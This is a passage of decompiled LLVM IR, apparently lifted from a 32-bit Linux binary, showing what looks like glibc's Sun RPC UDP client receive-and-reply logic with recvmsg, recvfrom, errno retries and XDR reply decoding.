  br i1 %v5_8062c8f170, label %dec_label_pc_8062c75, label %dec_label_pc_8062c91

dec_label_pc_8062c75:                             ; preds = %dec_label_pc_8062c61, %dec_label_pc_8062c75
  %stack_var_-9004.3172 = phi i32 [ %v4_8062c75, %dec_label_pc_8062c75 ], [ %v5_8062c64, %dec_label_pc_8062c61 ]
  %storemerge7.in171 = phi i32 [ %v4_8062c7b, %dec_label_pc_8062c75 ], [ %v5_8062c6d, %dec_label_pc_8062c61 ]
  %v4_8062c75 = add i32 %stack_var_-9004.3172, 1
  %v4_8062c7b = add i32 %storemerge7.in171, -1000000
  %v4_8062c85 = add i32 %storemerge7.in171, -1999999
  %v9_8062c85 = sub i32 1999998, %storemerge7.in171
  %v10_8062c85 = and i32 %v9_8062c85, %v4_8062c7b
  %v11_8062c85 = icmp slt i32 %v10_8062c85, 0
  %v12_8062c85 = icmp eq i32 %v4_8062c85, 0
  %v13_8062c85 = icmp slt i32 %v4_8062c85, 0
  %v3_8062c8f = icmp eq i1 %v13_8062c85, %v11_8062c85
  %v4_8062c8f = icmp eq i1 %v12_8062c85, false
  %v5_8062c8f = and i1 %v4_8062c8f, %v3_8062c8f
  br i1 %v5_8062c8f, label %dec_label_pc_8062c75, label %dec_label_pc_8062c91

dec_label_pc_8062c91:                             ; preds = %dec_label_pc_8062c75, %dec_label_pc_8062c61
  %storemerge7.in.lcssa = phi i32 [ %v5_8062c6d, %dec_label_pc_8062c61 ], [ %v4_8062c7b, %dec_label_pc_8062c75 ]
  %stack_var_-9004.3.lcssa = phi i32 [ %v5_8062c64, %dec_label_pc_8062c61 ], [ %v4_8062c75, %dec_label_pc_8062c75 ]
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v5_8062c9d = icmp slt i32 %stack_var_-9004.3.lcssa, %storemerge3
  br i1 %v5_8062c9d, label %dec_label_pc_8062b29, label %dec_label_pc_8062ca3

dec_label_pc_8062ca3:                             ; preds = %dec_label_pc_8062c91
  %v15_8062c97 = icmp eq i32 %stack_var_-9004.3.lcssa, %storemerge3
  %v1_8062ca3 = icmp eq i1 %v15_8062c97, false
  br i1 %v1_8062ca3, label %dec_label_pc_8062cb7, label %dec_label_pc_8062ca5

dec_label_pc_8062ca5:                             ; preds = %dec_label_pc_8062ca3
  store i32 %stack_var_-9000.0, i32* %ecx.global-to-local, align 4
  %v5_8062cb1 = icmp slt i32 %storemerge7.in.lcssa, %stack_var_-9000.0
  br i1 %v5_8062cb1, label %dec_label_pc_8062b29, label %dec_label_pc_8062cb7

dec_label_pc_8062cb7:                             ; preds = %dec_label_pc_8062ca5, %dec_label_pc_8062ca3, %dec_label_pc_8062b5c.dec_label_pc_8062cb7_crit_edge
  %v0_8062cbc = phi i32 [ %v0_8062cbc.pre, %dec_label_pc_8062b5c.dec_label_pc_8062cb7_crit_edge ], [ %v0_8062c61, %dec_label_pc_8062ca3 ], [ %v0_8062c61, %dec_label_pc_8062ca5 ]
  store i32 5, i32* %eax.global-to-local, align 4
  %v1_8062cbc = add i32 %v0_8062cbc, 44
  %v2_8062cbc = inttoptr i32 %v1_8062cbc to i32*
  store i32 5, i32* %v2_8062cbc, align 4
  br label %dec_label_pc_8062f33

dec_label_pc_8062cc8:                             ; preds = %dec_label_pc_8062b9d
  %v1_8062cc8 = call i32 @__errno_location(i32 %stack_var_-9008.2)
  store i32 %v1_8062cc8, i32* %eax.global-to-local, align 4
  %v1_8062ccd = inttoptr i32 %v1_8062cc8 to i32*
  %v2_8062ccd = load i32, i32* %v1_8062ccd, align 4
  store i32 %v2_8062ccd, i32* %eax.global-to-local, align 4
  %v1_8062ccf = add i32 %v2_8062ccd, -4
  br label %dec_label_pc_8062e3f

dec_label_pc_8062cd7:                             ; preds = %dec_label_pc_8062bbb
  br i1 %v5_8062cd7, label %dec_label_pc_8062e01, label %dec_label_pc_8062ce1

dec_label_pc_8062ce1:                             ; preds = %dec_label_pc_8062cd7
  store i32 %stack_var_-9028.2, i32* @ebx, align 4
  %v2_8062d02 = sub i32 %v1_8062baf, %v1_8062cf5
  store i32 %v2_8062d04, i32* %stack_var_-8980, align 4
  %v1_8062d10 = add i32 %v2_8062d02, 15
  %v1_8062d1a = and i32 %v1_8062d10, -16
  store i32 %v1_8062d1a, i32* %edx.global-to-local, align 4
  %v2_8062d1d = add i32 %v2_8062d02, -4
  %v3_8062d1d = inttoptr i32 %v2_8062d1d to i32*
  store i32 %v2_8062d0d, i32* %v3_8062d1d, align 4
  store i32 %v2_8062d1e, i32* %eax.global-to-local, align 4
  %v1_8062d24 = add i32 %v2_8062d02, -8
  %v2_8062d24 = inttoptr i32 %v1_8062d24 to i32*
  store i32 8192, i32* %v2_8062d24, align 4
  %v0_8062d29 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062d29 = add i32 %v0_8062d29, 256
  store i32 %v1_8062d29, i32* @edi, align 4
  %v2_8062d2f = add i32 %v2_8062d02, -12
  %v3_8062d2f = inttoptr i32 %v2_8062d2f to i32*
  store i32 %v2_8062d1e, i32* %v3_8062d2f, align 4
  %v0_8062d30 = load i32, i32* @edi, align 4
  store i32 %v0_8062d30, i32* %stack_var_-36, align 4
  %v0_8062d47 = load i32, i32* %edx.global-to-local, align 4
  %v0_8062d57 = load i32, i32* @esi, align 4
  %v1_8062d57 = inttoptr i32 %v0_8062d57 to i32*
  %v2_8062d57 = load i32, i32* %v1_8062d57, align 4
  %v4_8062d57 = add i32 %v2_8062d02, -16
  %v5_8062d57 = inttoptr i32 %v4_8062d57 to i32*
  store i32 %v2_8062d57, i32* %v5_8062d57, align 4
  %v0_8062d59 = load i32, i32* %stack_var_-8980, align 4
  %v3_8062d59 = call i32 @__libc_recvmsg(i32 %v0_8062d59, i32 16, i32 %v2_8062d0d)
  store i32 %v3_8062d59, i32* %eax.global-to-local, align 4
  %v0_8062d5e = load i32, i32* @esp, align 4
  %v1_8062d5e = add i32 %v0_8062d5e, 16
  store i32 %v3_8062d59, i32* @ebx, align 4
  %v2_8062d63 = icmp slt i32 %v3_8062d59, 0
  br i1 %v2_8062d63, label %dec_label_pc_8062e01, label %dec_label_pc_8062d6b

dec_label_pc_8062d6b:                             ; preds = %dec_label_pc_8062ce1
  %v2_8062d6b = add i32 %v0_8062d5e, 12
  %v3_8062d6b = inttoptr i32 %v2_8062d6b to i32*
  store i32 %v3_8062d59, i32* %v3_8062d6b, align 4
  %v0_8062d6c = load i32, i32* @ebx, align 4
  %v2_8062d6c = add i32 %v0_8062d5e, 8
  %v3_8062d6c = inttoptr i32 %v2_8062d6c to i32*
  store i32 %v0_8062d6c, i32* %v3_8062d6c, align 4
  %v0_8062d6d = load i32, i32* @esi, align 4
  %v1_8062d6d = add i32 %v0_8062d6d, 88
  %v2_8062d6d = inttoptr i32 %v1_8062d6d to i32*
  %v3_8062d6d = load i32, i32* %v2_8062d6d, align 4
  %v5_8062d6d = add i32 %v0_8062d5e, 4
  %v6_8062d6d = inttoptr i32 %v5_8062d6d to i32*
  store i32 %v3_8062d6d, i32* %v6_8062d6d, align 4
  %v0_8062d70 = load i32, i32* @edi, align 4
  %v3_8062d70 = inttoptr i32 %v0_8062d5e to i32*
  store i32 %v0_8062d70, i32* %v3_8062d70, align 4
  %v4_8062d71 = call i32 @bcmp(i8* inttoptr (i32 256 to i8*), i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8062d71, i32* %eax.global-to-local, align 4
  %v0_8062d76 = load i32, i32* @esp, align 4
  %v1_8062d76 = add i32 %v0_8062d76, 16
  %v1_8062d79 = icmp eq i32 %v4_8062d71, 0
  %v1_8062d7b = icmp eq i1 %v1_8062d79, false
  br i1 %v1_8062d7b, label %dec_label_pc_8062e01, label %dec_label_pc_8062d81

dec_label_pc_8062d81:                             ; preds = %dec_label_pc_8062d6b
  br i1 %v5_8062d81, label %dec_label_pc_8062e01, label %dec_label_pc_8062d8a

dec_label_pc_8062d8a:                             ; preds = %dec_label_pc_8062d81
  store i32 16, i32* %eax.global-to-local, align 4
  %v3_8062da0 = load i16, i16* %stack_var_-76, align 2
  %v14_8062da0 = icmp eq i16 %v3_8062da0, 2
  %v1_8062da5 = icmp eq i1 %v14_8062da0, false
  br i1 %v1_8062da5, label %dec_label_pc_8062e01, label %dec_label_pc_8062da7

dec_label_pc_8062da7:                             ; preds = %dec_label_pc_8062d8a
  %v0_8062da7 = load i32, i32* @esi, align 4
  %v1_8062da7 = add i32 %v0_8062da7, 12
  store i32 %v1_8062da7, i32* %eax.global-to-local, align 4
  %v0_8062daa = load i32, i32* @ecx, align 4
  %v2_8062daa = add i32 %v0_8062d76, 12
  %v3_8062daa = inttoptr i32 %v2_8062daa to i32*
  store i32 %v0_8062daa, i32* %v3_8062daa, align 4
  %v1_8062dab = add i32 %v0_8062d76, 8
  %v2_8062dab = inttoptr i32 %v1_8062dab to i32*
  store i32 4, i32* %v2_8062dab, align 4
  %v0_8062dad = load i32, i32* %eax.global-to-local, align 4
  %v2_8062dad = add i32 %v0_8062d76, 4
  %v3_8062dad = inttoptr i32 %v2_8062dad to i32*
  store i32 %v0_8062dad, i32* %v3_8062dad, align 4
  store i32 %v2_8062dae, i32* %eax.global-to-local, align 4
  %v3_8062db1 = inttoptr i32 %v0_8062d76 to i32*
  store i32 %v2_8062dae, i32* %v3_8062db1, align 4
  %v4_8062db2 = call i32 @bcmp(i8* inttoptr (i32 256 to i8*), i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8062db2, i32* %eax.global-to-local, align 4
  %v0_8062db7 = load i32, i32* @esp, align 4
  %v1_8062db7 = add i32 %v0_8062db7, 16
  %v1_8062dba = icmp eq i32 %v4_8062db2, 0
  %v1_8062dbc = icmp eq i1 %v1_8062dba, false
  br i1 %v1_8062dbc, label %dec_label_pc_8062e01, label %dec_label_pc_8062dbe

dec_label_pc_8062dbe:                             ; preds = %dec_label_pc_8062da7
  %v6_8062dbe = and i32 %v4_8062db2, -65536
  %v7_8062dbe = or i32 %v6_8062dbe, %v4_8062dbe
  store i32 %v7_8062dbe, i32* %eax.global-to-local, align 4
  %v2_8062dc2 = load i32, i32* @esi, align 4
  %v3_8062dc2 = add i32 %v2_8062dc2, 10
  %v4_8062dc2 = inttoptr i32 %v3_8062dc2 to i16*
  %v5_8062dc2 = load i16, i16* %v4_8062dc2, align 2
  %v16_8062dc2 = icmp eq i16 %tmp79, %v5_8062dc2
  %v1_8062dc6 = icmp eq i1 %v16_8062dc2, false
  br i1 %v1_8062dc6, label %dec_label_pc_8062e01, label %dec_label_pc_8062dc8

dec_label_pc_8062dc8:                             ; preds = %dec_label_pc_8062dbe
  store i32 %v0_8062d47, i32* %eax.global-to-local, align 4
  %v1_8062dfd36 = icmp eq i32 %v0_8062d47, 0
  %v1_8062dff43 = icmp eq i1 %v1_8062dfd36, false
  br i1 %v1_8062dff43, label %dec_label_pc_8062ddb, label %dec_label_pc_8062e01

dec_label_pc_8062ddb:                             ; preds = %dec_label_pc_8062dc8, %dec_label_pc_8062deb
  %v1_8062deb = phi i32 [ %v1_8062dfa, %dec_label_pc_8062deb ], [ %v1_8062db7, %dec_label_pc_8062dc8 ]
  %v0_8062a42 = phi i32 [ %v0_8062df5, %dec_label_pc_8062deb ], [ %v0_8062d47, %dec_label_pc_8062dc8 ]
  %v1_8062ddb = add i32 %v0_8062a42, 4
  %v2_8062ddb = inttoptr i32 %v1_8062ddb to i32*
  %v3_8062ddb = load i32, i32* %v2_8062ddb, align 4
  %v4_8062ddb = icmp eq i32 %v3_8062ddb, 0
  %v1_8062ddf = icmp eq i1 %v4_8062ddb, false
  br i1 %v1_8062ddf, label %dec_label_pc_8062deb, label %dec_label_pc_8062de1

dec_label_pc_8062de1:                             ; preds = %dec_label_pc_8062ddb
  %v1_8062de1 = add i32 %v0_8062a42, 8
  %v2_8062de1 = inttoptr i32 %v1_8062de1 to i32*
  %v3_8062de1 = load i32, i32* %v2_8062de1, align 4
  %v12_8062de1 = icmp eq i32 %v3_8062de1, 11
  br i1 %v12_8062de1, label %dec_label_pc_8062a42, label %dec_label_pc_8062deb

dec_label_pc_8062deb:                             ; preds = %dec_label_pc_8062de1, %dec_label_pc_8062ddb
  %v0_8062deb = load i32, i32* @edx, align 4
  %v2_8062deb = add i32 %v1_8062deb, -4
  %v3_8062deb = inttoptr i32 %v2_8062deb to i32*
  store i32 %v0_8062deb, i32* %v3_8062deb, align 4
  %v0_8062dec = load i32, i32* @edx, align 4
  %v2_8062dec = add i32 %v1_8062deb, -8
  %v3_8062dec = inttoptr i32 %v2_8062dec to i32*
  store i32 %v0_8062dec, i32* %v3_8062dec, align 4
  %v0_8062ded = load i32, i32* %eax.global-to-local, align 4
  %v2_8062ded = add i32 %v1_8062deb, -12
  %v3_8062ded = inttoptr i32 %v2_8062ded to i32*
  store i32 %v0_8062ded, i32* %v3_8062ded, align 4
  store i32 %v2_8062d1e, i32* %eax.global-to-local, align 4
  %v2_8062df4 = add i32 %v1_8062deb, -16
  %v3_8062df4 = inttoptr i32 %v2_8062df4 to i32*
  store i32 %v2_8062d1e, i32* %v3_8062df4, align 4
  %v0_8062df5 = call i32 @__cmsg_nxthdr()
  store i32 %v0_8062df5, i32* %eax.global-to-local, align 4
  %v0_8062dfa = load i32, i32* @esp, align 4
  %v1_8062dfa = add i32 %v0_8062dfa, 16
  %v1_8062dfd = icmp eq i32 %v0_8062df5, 0
  %v1_8062dff = icmp eq i1 %v1_8062dfd, false
  br i1 %v1_8062dff, label %dec_label_pc_8062ddb, label %dec_label_pc_8062e01

dec_label_pc_8062e01:                             ; preds = %dec_label_pc_8062dbe, %dec_label_pc_8062da7, %dec_label_pc_8062d8a, %dec_label_pc_8062d81, %dec_label_pc_8062d6b, %dec_label_pc_8062ce1, %dec_label_pc_8062cd7, %dec_label_pc_8062dc8, %dec_label_pc_8062deb, %dec_label_pc_8062e2b.dec_label_pc_8062e01_crit_edge
  %v1_8062e04 = phi i32 [ %v1_8062e04.pre, %dec_label_pc_8062e2b.dec_label_pc_8062e01_crit_edge ], [ %v1_8062db7, %dec_label_pc_8062dc8 ], [ %v1_8062db7, %dec_label_pc_8062dbe ], [ %v1_8062db7, %dec_label_pc_8062da7 ], [ %v1_8062d76, %dec_label_pc_8062d8a ], [ %v1_8062d76, %dec_label_pc_8062d81 ], [ %v1_8062d76, %dec_label_pc_8062d6b ], [ %v1_8062d5e, %dec_label_pc_8062ce1 ], [ %v1_8062baf, %dec_label_pc_8062cd7 ], [ %v1_8062dfa, %dec_label_pc_8062deb ]
  %v0_8062e04 = phi i32 [ %v1_8062e2b, %dec_label_pc_8062e2b.dec_label_pc_8062e01_crit_edge ], [ %v0_8062d47, %dec_label_pc_8062dc8 ], [ %v7_8062dbe, %dec_label_pc_8062dbe ], [ %v4_8062db2, %dec_label_pc_8062da7 ], [ 16, %dec_label_pc_8062d8a ], [ %v4_8062d71, %dec_label_pc_8062d81 ], [ %v4_8062d71, %dec_label_pc_8062d6b ], [ %v3_8062d59, %dec_label_pc_8062ce1 ], [ %v5_8062baa, %dec_label_pc_8062cd7 ], [ %v0_8062df5, %dec_label_pc_8062deb ]
  store i32 %v2_8062e01, i32* %edx.global-to-local, align 4
  %v2_8062e04 = add i32 %v1_8062e04, -4
  %v3_8062e04 = inttoptr i32 %v2_8062e04 to i32*
  store i32 %v0_8062e04, i32* %v3_8062e04, align 4
  %v0_8062e05 = load i32, i32* %eax.global-to-local, align 4
  %v2_8062e05 = add i32 %v1_8062e04, -8
  %v3_8062e05 = inttoptr i32 %v2_8062e05 to i32*
  store i32 %v0_8062e05, i32* %v3_8062e05, align 4
  store i32 %v2_8062e06, i32* %eax.global-to-local, align 4
  %v2_8062e09 = add i32 %v1_8062e04, -12
  %v3_8062e09 = inttoptr i32 %v2_8062e09 to i32*
  store i32 %v2_8062e06, i32* %v3_8062e09, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v2_8062e11 = add i32 %v1_8062e04, -16
  %v3_8062e11 = inttoptr i32 %v2_8062e11 to i32*
  store i32 %v2_8062e01, i32* %v3_8062e11, align 4
  %v1_8062e12 = add i32 %v1_8062e04, -20
  %v2_8062e12 = inttoptr i32 %v1_8062e12 to i32*
  store i32 0, i32* %v2_8062e12, align 4
  %v0_8062e14 = load i32, i32* @esi, align 4
  %v1_8062e14 = add i32 %v0_8062e14, 92
  %v2_8062e14 = inttoptr i32 %v1_8062e14 to i32*
  %v3_8062e14 = load i32, i32* %v2_8062e14, align 4
  %v5_8062e14 = add i32 %v1_8062e04, -24
  %v6_8062e14 = inttoptr i32 %v5_8062e14 to i32*
  store i32 %v3_8062e14, i32* %v6_8062e14, align 4
  %v0_8062e17 = load i32, i32* @esi, align 4
  %v1_8062e17 = add i32 %v0_8062e17, 96
  store i32 %v1_8062e17, i32* @ebx, align 4
  %v2_8062e1a = add i32 %v1_8062e04, -28
  %v3_8062e1a = inttoptr i32 %v2_8062e1a to i32*
  store i32 %v1_8062e17, i32* %v3_8062e1a, align 4
  %v0_8062e1b = load i32, i32* @esi, align 4
  %v1_8062e1b = inttoptr i32 %v0_8062e1b to i32*
  %v2_8062e1b = load i32, i32* %v1_8062e1b, align 4
  %v4_8062e1b = add i32 %v1_8062e04, -32
  %v5_8062e1b = inttoptr i32 %v4_8062e1b to i32*
  store i32 %v2_8062e1b, i32* %v5_8062e1b, align 4
  %v0_8062e1d = load i32, i32* %stack_var_-20, align 4
  %v4_8062e1d = load i32, i32* %stack_var_-4, align 4
  %v5_8062e1d = load i32, i32* %stack_var_0, align 4
  %v6_8062e1d = call i32 @__libc_recvfrom(i32 %v0_8062e1d, i32 %v0_80629e9, i32 %v0_80629e8, i32 %v0_80629e7, i32 %v4_8062e1d, i32 %v5_8062e1d)
  store i32 %v6_8062e1d, i32* %eax.global-to-local, align 4
  %v0_8062e22 = load i32, i32* @esp, align 4
  %v1_8062e22 = add i32 %v0_8062e22, 32
  store i32 %v6_8062e1d, i32* @ecx, align 4
  %v2_8062e27 = icmp slt i32 %v6_8062e1d, 0
  %v1_8062e29 = icmp eq i1 %v2_8062e27, false
  br i1 %v1_8062e29, label %dec_label_pc_8062e59, label %dec_label_pc_8062e2b

dec_label_pc_8062e2b:                             ; preds = %dec_label_pc_8062e01
  %v0_8062e2b = load i32, i32* %stack_var_-20, align 4
  %v1_8062e2b = call i32 @__errno_location(i32 %v0_8062e2b)
  store i32 %v1_8062e2b, i32* %eax.global-to-local, align 4
  %v1_8062e30 = inttoptr i32 %v1_8062e2b to i32*
  %v2_8062e30 = load i32, i32* %v1_8062e30, align 4
  %v11_8062e30 = icmp eq i32 %v2_8062e30, 4
  br i1 %v11_8062e30, label %dec_label_pc_8062e2b.dec_label_pc_8062e01_crit_edge, label %dec_label_pc_8062e35

dec_label_pc_8062e2b.dec_label_pc_8062e01_crit_edge: ; preds = %dec_label_pc_8062e2b
  %v1_8062e04.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8062e01

dec_label_pc_8062e35:                             ; preds = %dec_label_pc_8062e2b
  %v0_8062e35 = load i32, i32* %stack_var_-20, align 4
  %v1_8062e35 = call i32 @__errno_location(i32 %v0_8062e35)
  store i32 %v1_8062e35, i32* %eax.global-to-local, align 4
  %v1_8062e3a = inttoptr i32 %v1_8062e35 to i32*
  %v2_8062e3a = load i32, i32* %v1_8062e3a, align 4
  store i32 %v2_8062e3a, i32* %eax.global-to-local, align 4
  %v1_8062e3c = add i32 %v2_8062e3a, -11
  br label %dec_label_pc_8062e3f

dec_label_pc_8062e3f:                             ; preds = %dec_label_pc_8062cc8, %dec_label_pc_8062e35
  %v0_8062e4576 = phi i32 [ %v2_8062ccd, %dec_label_pc_8062cc8 ], [ %v2_8062e3a, %dec_label_pc_8062e35 ]
  %storemerge8.in = phi i32 [ %v1_8062ccf, %dec_label_pc_8062cc8 ], [ %v1_8062e3c, %dec_label_pc_8062e35 ]
  %storemerge8 = icmp eq i32 %storemerge8.in, 0
  br i1 %storemerge8, label %dec_label_pc_8062e3f.dec_label_pc_8062b9d.backedge_crit_edge, label %dec_label_pc_8062e45

dec_label_pc_8062e3f.dec_label_pc_8062b9d.backedge_crit_edge: ; preds = %dec_label_pc_8062e3f
  %v0_8062b9d.pre.pre = load i32, i32* @ecx, align 4
  %v1_8062b9d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8062b9d

dec_label_pc_8062e45:                             ; preds = %dec_label_pc_8062e3f, %dec_label_pc_8062a42
  %v0_8062e45 = phi i32 [ %v3_8062a42, %dec_label_pc_8062a42 ], [ %v0_8062e4576, %dec_label_pc_8062e3f ]
  %v1_8062e45 = load i32, i32* @esi, align 4
  %v2_8062e45 = add i32 %v1_8062e45, 48
  %v3_8062e45 = inttoptr i32 %v2_8062e45 to i32*
  store i32 %v0_8062e45, i32* %v3_8062e45, align 4
  br label %dec_label_pc_8062e48

dec_label_pc_8062e48:                             ; preds = %dec_label_pc_8062bc3, %dec_label_pc_8062bfb, %dec_label_pc_8062c0c, %dec_label_pc_8062c50, %dec_label_pc_8062e45
  store i32 4, i32* %eax.global-to-local, align 4
  %v0_8062e4d = load i32, i32* @esi, align 4
  %v1_8062e4d = add i32 %v0_8062e4d, 44
  %v2_8062e4d = inttoptr i32 %v1_8062e4d to i32*
  store i32 4, i32* %v2_8062e4d, align 4
  br label %dec_label_pc_8062f33

dec_label_pc_8062e59:                             ; preds = %dec_label_pc_8062e01
  %v7_8062e5c = icmp sgt i32 %v6_8062e1d, 3
  br i1 %v7_8062e5c, label %dec_label_pc_8062e62, label %dec_label_pc_8062b9d

dec_label_pc_8062e62:                             ; preds = %dec_label_pc_8062e59
  br i1 %v4_8062a8d, label %dec_label_pc_8062e76, label %dec_label_pc_8062e68

dec_label_pc_8062e68:                             ; preds = %dec_label_pc_8062e62
  %v0_8062e68 = load i32, i32* @esi, align 4
  %v1_8062e68 = add i32 %v0_8062e68, 88
  %v2_8062e68 = inttoptr i32 %v1_8062e68 to i32*
  %v3_8062e68 = load i32, i32* %v2_8062e68, align 4
  store i32 %v3_8062e68, i32* %edx.global-to-local, align 4
  %v1_8062e6b = add i32 %v0_8062e68, 96
  %v2_8062e6b = inttoptr i32 %v1_8062e6b to i32*
  %v3_8062e6b = load i32, i32* %v2_8062e6b, align 4
  store i32 %v3_8062e6b, i32* %eax.global-to-local, align 4
  %v2_8062e6e = inttoptr i32 %v3_8062e68 to i32*
  %v3_8062e6e = load i32, i32* %v2_8062e6e, align 4
  %v14_8062e6e = icmp eq i32 %v3_8062e6b, %v3_8062e6e
  %v1_8062e70 = icmp eq i1 %v14_8062e6e, false
  br i1 %v1_8062e70, label %dec_label_pc_8062b9d, label %dec_label_pc_8062e76

dec_label_pc_8062e76:                             ; preds = %dec_label_pc_8062e68, %dec_label_pc_8062e62
  %v1_8062e76 = add i32 %v0_8062e22, 28
  %v2_8062e76 = inttoptr i32 %v1_8062e76 to i32*
  store i32 1, i32* %v2_8062e76, align 4
  %v0_8062e78 = load i32, i32* @ecx, align 4
  %v2_8062e78 = add i32 %v0_8062e22, 24
  %v3_8062e78 = inttoptr i32 %v2_8062e78 to i32*
  store i32 %v0_8062e78, i32* %v3_8062e78, align 4
  %v0_8062e79 = load i32, i32* @ebx, align 4
  %v2_8062e79 = add i32 %v0_8062e22, 20
  %v3_8062e79 = inttoptr i32 %v2_8062e79 to i32*
  store i32 %v0_8062e79, i32* %v3_8062e79, align 4
  store i32 %v2_8062e7a, i32* @ebx, align 4
  %v2_8062e7d = add i32 %v0_8062e22, 16
  %v3_8062e7d = inttoptr i32 %v2_8062e7d to i32*
  store i32 %v2_8062e7a, i32* %v3_8062e7d, align 4
  %v0_8062e7e = load i32, i32* %stack_var_-20, align 4
  %v4_8062e7e = inttoptr i32 %v0_8062e7e to i32*
  %v5_8062e7e = call i32 @__GI_xdrmem_create(i32* %v4_8062e7e, i32 %v0_80629e9, i32 %v0_80629e8, i32 %v0_80629e7)
  store i32 %v5_8062e7e, i32* %eax.global-to-local, align 4
  %v0_8062e83 = load i32, i32* @esp, align 4
  %v1_8062e83 = inttoptr i32 %v0_8062e83 to i32*
  %v3_8062e83 = add i32 %v0_8062e83, 4
  store i32 %v2_8062e84, i32* @edi, align 4
  %v1_8062e8a = inttoptr i32 %v3_8062e83 to i32*
  %v2_8062e8a = load i32, i32* %v1_8062e8a, align 4
  store i32 %v2_8062e8a, i32* @eax, align 4
  store i32 %v2_8062e84, i32* %v1_8062e8a, align 4
  store i32 %v2_8062e7a, i32* %v1_8062e83, align 4
  %v0_8062e8d = call i32 @__GI_xdr_replymsg()
  store i32 %v0_8062e8d, i32* %eax.global-to-local, align 4
  %v0_8062e92 = load i32, i32* @esp, align 4
  %v1_8062e95 = icmp eq i32 %v0_8062e8d, 0
  %v0_8062f29 = load i32, i32* @esi, align 4
  %v1_8062f29 = add i32 %v0_8062f29, 44
  br i1 %v1_8062e95, label %dec_label_pc_8062f29, label %dec_label_pc_8062e9d

dec_label_pc_8062e9d:                             ; preds = %dec_label_pc_8062e76
  store i32 %v1_8062f29, i32* %eax.global-to-local, align 4
  %v0_8062ea0 = load i32, i32* @ecx, align 4
  %v2_8062ea0 = add i32 %v0_8062e92, 12
  %v3_8062ea0 = inttoptr i32 %v2_8062ea0 to i32*
  store i32 %v0_8062ea0, i32* %v3_8062ea0, align 4
  %v0_8062ea1 = load i32, i32* @ecx, align 4
  %v2_8062ea1 = add i32 %v0_8062e92, 8
  %v3_8062ea1 = inttoptr i32 %v2_8062ea1 to i32*
  store i32 %v0_8062ea1, i32* %v3_8062ea1, align 4
  %v0_8062ea2 = load i32, i32* %eax.global-to-local, align 4
  %v2_8062ea2 = add i32 %v0_8062e92, 4
  %v3_8062ea2 = inttoptr i32 %v2_8062ea2 to i32*
  store i32 %v0_8062ea2, i32* %v3_8062ea2, align 4
  %v3_8062ea3 = inttoptr i32 %v0_8062e92 to i32*
  store i32 %v2_8062e84, i32* %v3_8062ea3, align 4
  %v0_8062ea4 = call i32 @__GI__seterr_reply()
  store i32 %v0_8062ea4, i32* %eax.global-to-local, align 4
  %v0_8062ea9 = load i32, i32* @esp, align 4
  %v0_8062eac = load i32, i32* @esi, align 4
  %v1_8062eac = add i32 %v0_8062eac, 44
  %v2_8062eac = inttoptr i32 %v1_8062eac to i32*
  %v3_8062eac = load i32, i32* %v2_8062eac, align 4
  %v4_8062eac = icmp eq i32 %v3_8062eac, 0
  %v1_8062eb0 = icmp eq i1 %v4_8062eac, false
  br i1 %v1_8062eb0, label %dec_label_pc_8062eff, label %dec_label_pc_8062eb2

dec_label_pc_8062eb2:                             ; preds = %dec_label_pc_8062e9d
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  store i32 %v2_8062b69, i32* @ebx, align 4
  %v2_8062ebb = load i32, i32* %arg1, align 4
  store i32 %v2_8062ebb, i32* %eax.global-to-local, align 4
  %v2_8062ebd = add i32 %v0_8062ea9, 12
  %v3_8062ebd = inttoptr i32 %v2_8062ebd to i32*
  store i32 %tmp111, i32* %v3_8062ebd, align 4
  %v0_8062ebe = load i32, i32* %edx.global-to-local, align 4
  %v2_8062ebe = add i32 %v0_8062ea9, 8
  %v3_8062ebe = inttoptr i32 %v2_8062ebe to i32*
  store i32 %v0_8062ebe, i32* %v3_8062ebe, align 4
  %v1_8062ebf = add i32 %v2_8062ebb, 32
  %v2_8062ebf = inttoptr i32 %v1_8062ebf to i32*
  %v3_8062ebf = load i32, i32* %v2_8062ebf, align 4
  store i32 %v3_8062ebf, i32* %edx.global-to-local, align 4
  %v2_8062ec2 = add i32 %v0_8062ea9, 4
  %v3_8062ec2 = inttoptr i32 %v2_8062ec2 to i32*
  store i32 %v2_8062b69, i32* %v3_8062ec2, align 4
  %v3_8062ec3 = inttoptr i32 %v0_8062ea9 to i32*
  store i32 %v2_8062ebb, i32* %v3_8062ec3, align 4
  %v1_8062ec4 = add i32 %v0_8062ea9, -4
  %v2_8062ec4 = inttoptr i32 %v1_8062ec4 to i32*
  store i32 134622919, i32* %v2_8062ec4, align 4
  %v3_8062ec4 = load i32, i32* %edx.global-to-local, align 4
  %v4_8062ec4 = add i32 %v3_8062ec4, 8
  %v5_8062ec4 = inttoptr i32 %v4_8062ec4 to i32*
  %v6_8062ec4 = load i32, i32* %v5_8062ec4, align 4
  call void @__pseudo_call(i32 %v6_8062ec4)
  %v1_8062eca = icmp eq i32 %v2_8062ebb, 0
  %v1_8062ecc = icmp eq i1 %v1_8062eca, false
  br i1 %v1_8062ecc, label %dec_label_pc_8062edc, label %dec_label_pc_8062ece

dec_label_pc_8062ece:                             ; preds = %dec_label_pc_8062eb2
  %v0_8062ece = load i32, i32* @esi, align 4
  %v1_8062ece = add i32 %v0_8062ece, 44
  %v2_8062ece = inttoptr i32 %v1_8062ece to i32*
  store i32 7, i32* %v2_8062ece, align 4
  %v0_8062ed5 = load i32, i32* @esi, align 4
  %v1_8062ed5 = add i32 %v0_8062ed5, 48
  %v2_8062ed5 = inttoptr i32 %v1_8062ed5 to i32*
  store i32 6, i32* %v2_8062ed5, align 4
  br label %dec_label_pc_8062edc

dec_label_pc_8062edc:                             ; preds = %dec_label_pc_8062eb2, %dec_label_pc_8062ece
  %v4_8062edc = icmp eq i32 %tmp, 0
  br i1 %v4_8062edc, label %dec_label_pc_8062f30, label %dec_label_pc_8062ee5

dec_label_pc_8062ee5:                             ; preds = %dec_label_pc_8062edc
  store i32 %v1_8062a84, i32* %ecx.global-to-local, align 4
  %v1_8062eeb = inttoptr i32 %v1_8062a84 to i32*
  store i32 2, i32* %v1_8062eeb, align 4
  %v1_8062ef1 = load i32, i32* @esp, align 4
  %v2_8062ef1 = add i32 %v1_8062ef1, -4
